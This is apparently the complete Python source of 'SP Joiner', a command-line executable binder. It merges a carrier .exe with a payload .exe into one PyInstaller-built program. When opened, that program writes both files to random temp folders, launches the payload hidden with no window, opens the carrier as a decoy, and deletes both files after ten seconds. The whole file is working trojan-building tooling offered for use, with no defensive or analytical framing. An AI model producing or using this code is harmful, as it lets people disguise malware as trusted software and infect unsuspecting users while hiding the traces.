#!/usr/bin/env python3
import os
import sys
import argparse
import tempfile
import subprocess
import shutil
from pathlib import Path
from colorama import Fore, Style, init
import itertools
from threading import Thread
from time import sleep


init(autoreset=True)

class SPJoiner:
    def __init__(self):
        self.banner = Fore.GREEN + """
  ███████╗██████╗      ██╗  ██████╗██╗███╗   ██╗███████╗██████╗ 
  ██╔════╝██╔══██╗     ██║██╔═══██╗██║████╗  ██║██╔════╝██╔══██╗
  ███████╗██████╔╝     ██║██║   ██║██║██╔██╗ ██║█████╗  ██████╔╝
  ╚════██║██╔═══╝  ██  ██║██║   ██║██║██║╚██╗██║██╔══╝  ██╔══██╗
  ███████║██║     ╚█████╔╝╚██████╔╝██║██║ ╚████║███████╗██║  ██║
  ╚══════╝╚═╝      ╚════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                         by tsmi-WS
                    Simple Python Joiner
"""
        self.temp_dir = tempfile.gettempdir()
        self.is_windows = os.name == 'nt'

    def _spinning_cursor(self, done_flag):
        spinner = itertools.cycle(['|', '/', '-', '\\'])
        while not done_flag[0]:
            sys.stdout.write(f'\r⌛️ Compiling... {next(spinner)}')
            sys.stdout.flush()
            sleep(0.1)
        sys.stdout.write('\r✅ ' + Fore.GREEN + 'Compilation finished!')

    def create_joiner(self, carrier_path, payload_path, output_name):
        if not self.is_windows:
            print("❌ " + Fore.RED + "Compilation can only be done on a Windows system.")
            sys.exit(1)

        try:
            for path in [carrier_path, payload_path]:
                if not os.path.exists(path):
                    raise ValueError("❌ " + Fore.RED + f"File not found: {path}")
                if not path.endswith('.exe'):
                    raise ValueError("❌ " + Fore.RED + f"File must be .exe: {path}")

            print("⚙️ " + Fore.YELLOW + " Preparing joiner package...")

            output_name = output_name.replace('.exe', '')

            joiner_script = fr'''
import sys
import os
import tempfile
import subprocess
import shutil
import time
import random
import string

def run():
    try:
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")

        joined_path = os.path.join(base_path, 'joined.exe')
        with open(joined_path, 'rb') as f:
            data = f.read()

        marker = b'PAYLOAD_MARKER:'
        marker_pos = data.find(marker)
        if marker_pos == -1:
            raise Exception("Payload marker not found.")

        carrier_data = data[:marker_pos]
        payload_data = data[marker_pos + len(marker):]

        # Generate temp subfolders to avoid name conflict
        def rand_folder(prefix):
            return os.path.join(tempfile.gettempdir(), prefix + ''.join(random.choices(string.ascii_lowercase, k=8)))

        exe_name = os.path.basename(sys.argv[0])
        carrier_dir = rand_folder("cr_")
        payload_dir = rand_folder("pl_")
        os.makedirs(carrier_dir, exist_ok=True)
        os.makedirs(payload_dir, exist_ok=True)

        carrier_path = os.path.join(carrier_dir, exe_name)
        payload_path = os.path.join(payload_dir, exe_name)

        with open(carrier_path, 'wb') as f:
            f.write(carrier_data)
        with open(payload_path, 'wb') as f:
            f.write(payload_data)

        # Start payload silently
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        subprocess.Popen(
            payload_path,
            startupinfo=startupinfo,
            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
        )

        # Start carrier normally
        os.startfile(carrier_path)

        time.sleep(10)
        for f in [carrier_path, payload_path]:
            try:
                os.remove(f)
            except:
                pass
        shutil.rmtree(carrier_dir, ignore_errors=True)
        shutil.rmtree(payload_dir, ignore_errors=True)

    except Exception as e:
        print(f"[Joiner Error] {{e}}")

if __name__ == "__main__":
    run()
'''

            temp_script = os.path.join(self.temp_dir, "joiner_script.py")
            temp_package = os.path.join(self.temp_dir, "joined.exe")

            with open(temp_script, 'w', encoding='utf-8') as f:
                f.write(joiner_script)

            with open(carrier_path, 'rb') as f_carrier, \
                 open(payload_path, 'rb') as f_payload, \
                 open(temp_package, 'wb') as f_out:
                f_out.write(f_carrier.read())
                f_out.write(b'PAYLOAD_MARKER:')
                f_out.write(f_payload.read())

            done_flag = [False]
            spinner_thread = Thread(target=self._spinning_cursor, args=(done_flag,))
            spinner_thread.start()

            pyinstaller_args = [
                sys.executable,
                '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                '--add-data', f'{temp_package};.',
                '--name', output_name,
                '--distpath', str(Path.cwd() / 'dist'),
                '--workpath', str(Path.cwd() / 'build'),
                '--specpath', str(Path.cwd()),
                '--clean',
                temp_script
            ]

            result = subprocess.run(
                pyinstaller_args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            done_flag[0] = True
            spinner_thread.join()

            if result.returncode != 0:
                print("❌ " + Fore.RED + "PyInstaller failed:")
                print(Fore.YELLOW + result.stdout)
                print(Fore.RED + result.stderr)
                return False

            dist_file = Path('dist') / f"{output_name}.exe"
            output_dir = Path('output')
            output_dir.mkdir(exist_ok=True)
            final_output = output_dir / f"{output_name}.exe"

            if dist_file.exists():
                shutil.move(dist_file, final_output)
                shutil.rmtree('dist', ignore_errors=True)
                print("\n✅ " + Fore.GREEN + f"Success! Joiner created: {final_output}")
                print("📥 " + Fore.GREEN + f"File size: {final_output.stat().st_size/1024:.2f} KB")
                return True
            else:
                print("\n❌ " + Fore.RED + "Output file not found")
                return False

        except Exception as e:
            print("\n❌ " + Fore.RED + f"{str(e)}")
            return False
        finally:
            self._cleanup()

    def _cleanup(self):
        for folder in ['build', '__pycache__']:
            shutil.rmtree(folder, ignore_errors=True)
        
        for spec in Path('.').glob('*.spec'):
            try:
                spec.unlink()
            except:
                pass
        
        for f in ['joiner_script.py', 'joined.exe']:
            try:
                os.remove(os.path.join(self.temp_dir, f))
            except:
                pass

def main():
    joiner = SPJoiner()
    print(joiner.banner)

    parser = argparse.ArgumentParser(description='SP Joiner')
    parser.add_argument('-c', '--carrier', required=True, help='Carrier executable (.exe)')
    parser.add_argument('-p', '--payload', required=True, help='Payload executable (.exe)')
    parser.add_argument('-o', '--output', required=True, help='Output file name (without .exe)')

    args = parser.parse_args()

    if not joiner.create_joiner(args.carrier, args.payload, args.output):
        sys.exit(1)

if __name__ == "__main__":
    main()
